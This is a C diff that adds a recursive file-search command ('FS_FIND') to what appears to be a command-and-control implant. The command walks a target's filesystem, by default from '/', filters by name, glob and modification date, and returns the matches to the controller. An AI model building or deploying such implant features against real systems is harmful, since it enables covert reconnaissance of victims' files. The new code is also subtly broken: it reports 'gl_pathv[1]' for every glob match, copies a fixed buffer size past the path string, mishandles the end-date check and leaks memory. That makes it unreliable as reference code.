@@ -30,6 +30,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <dirent.h>
 
 #include <sys/stat.h>
 #include <glob.h>
@@ -85,6 +86,10 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        FS_BASE, \
                        API_CALL + 9)
+#define FS_FIND \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       FS_BASE, \
+                       API_CALL + 10)
 
 #define FS_PIPE_FILE \
         TLV_PIPE_CUSTOM(PIPE_STATIC, \
@@ -92,6 +97,10 @@
                         PIPE_TYPE)
 
 #define TLV_TYPE_MODE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, FS_BASE, API_TYPE)
+
+#define TLV_TYPE_START_DATE TLV_TYPE_CUSTOM(TLV_TYPE_INT, FS_BASE, API_TYPE)
+#define TLV_TYPE_END_DATE   TLV_TYPE_CUSTOM(TLV_TYPE_INT, FS_BASE, API_TYPE + 1)
+
 
 #if defined(IS_MACOS) || defined(IS_IPHONE)
 #include <libkern/OSByteOrder.h>
@@ -112,6 +121,10 @@
 
 #ifndef GLOB_TILDE
 #define GLOB_TILDE 0
+#endif
+
+#ifndef GLOB_PERIOD
+#define GLOB_PERIOD 0
 #endif
 
 struct stat_table
@@ -137,6 +150,13 @@ typedef struct tree
     eio_req *group_dir;
     char path[PATH_MAX];
 } tree_t;
+
+typedef struct find_entry
+{
+    char *dir;
+    struct find_entry *next;
+    struct find_entry *prev;
+} find_entry_t;
 
 eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data);
 
@@ -314,7 +334,7 @@ eio_req *eio_rmtree(char *path, int pri, eio_cb cb, void *data)
     return tree->group_dir;
 }
 
-static void fs_add_stat(tlv_pkt_t **tlv_pkt, EIO_STRUCT_STAT *stat)
+static struct stat_table fs_mkstat(struct stat *stat)
 {
     struct stat_table stat_buffer;
 
@@ -334,7 +354,15 @@ static void fs_add_stat(tlv_pkt_t **tlv_pkt, EIO_STRUCT_STAT *stat)
     stat_buffer.ctime = htole64(stat->st_ctim.tv_sec);
 #endif
 
-    tlv_pkt_add_raw(*tlv_pkt, TLV_TYPE_BYTES, &stat_buffer, sizeof(stat_buffer));
+    return stat_buffer;
+}
+
+static void fs_add_stat(tlv_pkt_t **tlv_pkt, struct stat *stat)
+{
+    struct stat_table buffer;
+
+    buffer = fs_mkstat(stat);
+    tlv_pkt_add_raw(*tlv_pkt, TLV_TYPE_BYTES, &buffer, sizeof(buffer));
 }
 
 static int fs_eio(eio_req *request)
@@ -523,6 +551,272 @@ static int fs_eio_dir_delete(eio_req *request)
     return request->result;
 }
 
+static void fs_add_find_stat(tlv_pkt_t *tlv_pkt, EIO_STRUCT_STAT *stat, char *path, char *name)
+{
+    tlv_pkt_t *entry;
+
+    entry = tlv_pkt_create();
+
+    fs_add_stat(&entry, stat);
+    tlv_pkt_add_string(entry, TLV_TYPE_FILENAME, name);
+    tlv_pkt_add_string(entry, TLV_TYPE_PATH, path);
+
+    tlv_pkt_add_tlv(tlv_pkt, TLV_TYPE_GROUP, entry);
+    tlv_pkt_destroy(entry);
+}
+
+static int fs_find_glob(c2_t *c2, char *root, char *name,
+                        int start_date, int end_date)
+{
+    size_t iter;
+    glob_t result;
+
+    struct stat stat_result;
+    struct stat_table buffer;
+
+    char path[PATH_MAX + 1];
+
+    if (snprintf(path, PATH_MAX + 1, "%s/%s", root, name) < 0)
+    {
+        return -1;
+    }
+
+    memset(&result, 0, sizeof(glob_t));
+    memset(&stat_result, 0, sizeof(struct stat));
+
+    if (glob(path, GLOB_TILDE | GLOB_PERIOD, NULL, &result) != 0)
+    {
+        globfree(&result);
+        return -1;
+    }
+
+    for (iter = 0; iter < result.gl_pathc; iter++)
+    {
+        if (stat(result.gl_pathv[iter], &stat_result) != 0)
+        {
+            continue;
+        }
+
+        buffer = fs_mkstat(&stat_result);
+        if ((start_date != UINT32_MAX) && (start_date > buffer.mtime))
+        {
+            continue;
+        }
+
+        if ((end_date != UINT32_MAX) && (end_date < buffer.mtime))
+        {
+            continue;
+        }
+
+        fs_add_find_stat(c2->response, &stat_result,
+                         root, basename(result.gl_pathv[1]));
+    }
+
+    globfree(&result);
+    return 0;
+}
+
+static void fs_eio_find(struct eio_req *request)
+{
+    c2_t *c2;
+    DIR *dir;
+
+    int recursive;
+    int start_date;
+    int end_date;
+    int root_length;
+    int abs_length;
+
+    char path[PATH_MAX];
+    char root[PATH_MAX];
+    char abs_path[PATH_MAX + 1];
+
+    struct dirent *entry;
+    struct stat stat_result;
+    struct stat_table buffer;
+
+    find_entry_t *curr_entry;
+    find_entry_t *last_entry;
+
+    c2 = request->data;
+
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &recursive);
+    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, path);
+
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PATH, root) < 0)
+    {
+        root[0] = '/';
+        root[1] = 0;
+    }
+
+    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_START_DATE, &start_date) < 0)
+    {
+        start_date = UINT32_MAX;
+    }
+
+    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_END_DATE, &end_date))
+    {
+        end_date = UINT32_MAX;
+    }
+
+    curr_entry = malloc(sizeof(find_entry_t));
+    if (curr_entry == NULL)
+    {
+        goto fail;
+    }
+
+    root_length = strlen(root);
+    if (root_length > PATH_MAX)
+    {
+        goto fail;
+    }
+
+    curr_entry->dir = malloc(root_length + 1);
+    if (curr_entry->dir == NULL)
+    {
+        free(curr_entry);
+        goto fail;
+    }
+
+    memcpy(curr_entry->dir, root, root_length);
+    curr_entry->dir[root_length] = 0;
+    curr_entry->next = NULL;
+    curr_entry->prev = NULL;
+
+    last_entry = curr_entry;
+    if ((dir = opendir(root)) == NULL)
+    {
+        goto fail;
+    }
+
+    c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+
+    while (curr_entry != NULL && dir != NULL)
+    {
+        entry = readdir(dir);
+
+        if (entry == NULL && curr_entry->next == NULL)
+        {
+            closedir(dir);
+            if (strchr(path, '*') != NULL)
+            {
+                fs_find_glob(c2, curr_entry->dir, path, start_date, end_date);
+            }
+
+            free(curr_entry->dir);
+            free(curr_entry);
+            break;
+        }
+
+        if (entry == NULL)
+        {
+            closedir(dir);
+            if (strchr(path, '*') != NULL)
+            {
+                fs_find_glob(c2, curr_entry->dir, path, start_date, end_date);
+            }
+
+            curr_entry = curr_entry->next;
+            free(curr_entry->prev->dir);
+            free(curr_entry->prev);
+
+            while ((dir = opendir(curr_entry->dir)) == NULL)
+            {
+                if (!curr_entry->next)
+                {
+                    free(curr_entry->dir);
+                    free(curr_entry);
+                    break;
+                }
+
+                curr_entry = curr_entry->next;
+                free(curr_entry->prev->dir);
+                free(curr_entry->prev);
+            }
+
+            continue;
+        }
+
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+        {
+            continue;
+        }
+
+        if (strcmp(curr_entry->dir, "/") == 0)
+        {
+            snprintf(abs_path, sizeof(abs_path), "/%s", entry->d_name);
+        }
+        else
+        {
+            snprintf(abs_path, sizeof(abs_path), "%s/%s", curr_entry->dir, entry->d_name);
+        }
+
+        if (stat(abs_path, &stat_result) != 0)
+        {
+            continue;
+        }
+
+        if (S_ISDIR(stat_result.st_mode) && recursive)
+        {
+            abs_length = sizeof(abs_path);
+            last_entry->next = malloc(sizeof(find_entry_t));
+
+            if (last_entry->next == NULL)
+            {
+                continue;
+            }
+
+            last_entry->next->prev = last_entry;
+            last_entry = last_entry->next;
+            last_entry->dir = malloc(abs_length + 1);
+
+            if (last_entry->dir == NULL)
+            {
+                last_entry = last_entry->prev;
+                free(last_entry->next);
+            }
+            else
+            {
+                memcpy(last_entry->dir, abs_path, abs_length);
+                last_entry->next = NULL;
+            }
+        }
+
+        if (strchr(path, '*') != NULL)
+        {
+            continue;
+        }
+
+        if (strcmp(entry->d_name, path) == 0)
+        {
+            buffer = fs_mkstat(&stat_result);
+
+            if ((start_date != UINT32_MAX) && (start_date > buffer.mtime))
+            {
+                continue;
+            }
+
+            if ((end_date != UINT32_MAX) && (end_date < buffer.mtime))
+            {
+                continue;
+            }
+
+            fs_add_find_stat(c2->response, &stat_result, curr_entry->dir, entry->d_name);
+        }
+    }
+
+    goto finalize;
+
+fail:
+    c2->response = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+
+finalize:
+    c2_enqueue_tlv(c2, c2->response);
+
+    tlv_pkt_destroy(c2->request);
+    tlv_pkt_destroy(c2->response);
+}
+
 static void fs_eio_file_copy(struct eio_req *request)
 {
     c2_t *c2;
@@ -577,6 +871,12 @@ finalize:
 
     tlv_pkt_destroy(c2->request);
     tlv_pkt_destroy(c2->response);
+}
+
+static tlv_pkt_t *fs_find(c2_t *c2)
+{
+    eio_custom(fs_eio_find, 0, NULL, c2);
+    return NULL;
 }
 
 static tlv_pkt_t *fs_list(c2_t *c2)
@@ -772,6 +1072,7 @@ void register_fs_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, FS_FILE_COPY, fs_file_copy);
     api_call_register(api_calls, FS_FILE_MOVE, fs_file_move);
     api_call_register(api_calls, FS_DIR_DELETE, fs_dir_delete);
+    api_call_register(api_calls, FS_FIND, fs_find);
 }
 
 void register_fs_api_pipes(pipes_t **pipes)
